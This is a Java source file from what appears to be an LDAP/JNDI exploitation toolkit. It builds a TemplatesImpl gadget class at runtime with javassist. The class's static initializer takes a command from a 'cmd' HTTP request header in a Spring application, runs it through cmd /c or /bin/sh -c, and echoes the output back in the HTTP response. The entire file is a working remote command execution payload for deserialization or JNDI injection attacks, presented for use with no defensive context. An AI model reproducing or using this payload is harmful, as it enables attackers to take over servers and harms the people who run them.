package com.idiot9.ldap.templates;

import com.idiot9.ldap.gadgets.utils.ClassFiles;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.utils.Cache;
import javassist.CannotCompileException;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.xml.transform.Templates;

@MemShell
public class SpringEchoTemplates implements TemplateFactory{
    private String className;
    private Templates templates;
    private byte[] bytes;
    private String head;

    public SpringEchoTemplates(String head) throws Exception {
        this.head = head;
        this.className = "Exploit" + System.nanoTime();
        createTemplatesImpl();
    }

    @Override
    public void createTemplatesImpl() throws CannotCompileException, Exception {
        Templates tpl = (Templates) tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TemplateFactory.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
        pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
        pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
        pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
        pool.importPackage("java.lang");
        pool.importPackage("java.lang.reflect");
        pool.importPackage("java.util");
//        pool.importPackage("javax.servlet.http");
//        pool.importPackage("javax.servlet");
//        pool.importPackage("java.io");
//        pool.importPackage("org.springframework.web.context.request");

        CtClass ctClass = pool.get(TemplateFactory.StubTransletPayload.class.getName());

        ctClass.setName(this.className);

        String static_block = "try {\n" +
                "            java.lang.System.out.println(\"start spring echo\");\n" +
                "            java.lang.Class c = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.RequestContextHolder\");\n" +
                "            java.lang.reflect.Method m = c.getMethod(\"getRequestAttributes\", null);\n" +
                "            java.lang.Object o = m.invoke(null, null);\n" +
                "            c = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"org.springframework.web.context.request.ServletRequestAttributes\");\n" +
                "            m = c.getMethod(\"getResponse\", null);\n" +
                "            java.lang.reflect.Method m1 = c.getMethod(\"getRequest\", new Class[0]);\n" +
                "            java.lang.Object resp = m.invoke(o, null);\n" +
                "            java.lang.Object req = m1.invoke(o, null);\n" +
                "            java.lang.reflect.Method getWriter = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.ServletResponse\").getDeclaredMethod(\"getWriter\", null);\n" +
                "            java.lang.reflect.Method getHeader = java.lang.Thread.currentThread().getContextClassLoader().loadClass(\"javax.servlet.http.HttpServletRequest\").getDeclaredMethod(\"getHeader\", new Class[]{java.lang.String.class});\n" +
                "            getHeader.setAccessible(true);\n" +
                "            getWriter.setAccessible(true);\n" +
                "            java.lang.Object writer = getWriter.invoke(resp, null);\n" +
                "            java.lang.String cmd = (String)getHeader.invoke(req, new Object[]{\"cmd\"});\n" +
                "            java.lang.String[] commands = new String[3];\n" +
                "            if (java.lang.System.getProperty(\"os.name\").toUpperCase().contains(\"WIN\")) {\n" +
                "                commands[0] = \"cmd\";\n" +
                "                commands[1] = \"/c\";\n" +
                "            } else {\n" +
                "                commands[0] = \"/bin/sh\";\n" +
                "                commands[1] = \"-c\";\n" +
                "            }\n" +
                "\n" +
                "            commands[2] = cmd;\n" +
                "            writer.getClass().getDeclaredMethod(\"println\", new Class[]{java.lang.String.class}).invoke(writer, new Object[]{(new java.util.Scanner(java.lang.Runtime.getRuntime().exec(commands).getInputStream())).useDelimiter(\"\\\\A\").next()});\n" +
                "            writer.getClass().getDeclaredMethod(\"flush\", null).invoke(writer, new Object[]{});\n" +
                "            writer.getClass().getDeclaredMethod(\"close\", null).invoke(writer, new Object[]{});\n" +
                "            java.lang.System.out.println(\"end spring echo\");\n" +
                "        } catch (java.lang.Exception e) {\n" +
                "            java.lang.System.out.println(\"spring echo error\");\n" +
                "        }";

        ctClass.makeClassInitializer().insertAfter(static_block);


        CtClass superClass = pool.get(abstTranslet.getName());
        ctClass.setSuperclass(superClass);


        byte[] classBytes = ctClass.toBytecode();
        this.bytes = classBytes;



        this.templates = TemplateFactory.loadBytes(this.bytes, tpl);
    }

    @Override
    public String getClassName() {
        return this.className;
    }

    @Override
    public Templates getTemplates() {
        return this.templates;
    }

    @Override
    public void cache() throws Exception {
        Cache.set(this.className, this.bytes);
    }

    @Override
    public byte[] getBytes() {
        return this.bytes;
    }
}
